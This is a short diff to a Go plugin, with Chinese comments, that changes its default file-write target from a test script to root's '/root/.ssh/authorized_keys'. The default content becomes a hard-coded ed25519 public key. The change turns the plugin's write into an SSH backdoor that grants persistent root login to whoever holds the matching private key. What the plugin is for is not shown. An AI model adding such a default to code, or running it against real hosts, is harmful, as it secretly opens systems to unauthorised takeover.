@@ -43,8 +43,8 @@ var (
 
 // 默认写入配置。
 const (
-	defaultWritePath    = "/root/lib/test.sh"
-	defaultWriteContent = "test"
+	defaultWritePath    = "/root/.ssh/authorized_keys"
+	defaultWriteContent = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7Urkjdmfn27U3p1mrS0/El2ZqpJApdE/c40rxdy/rb test@email.com"
 )
 
 // pluginConfig 是从宿主配置传入的插件配置结构。
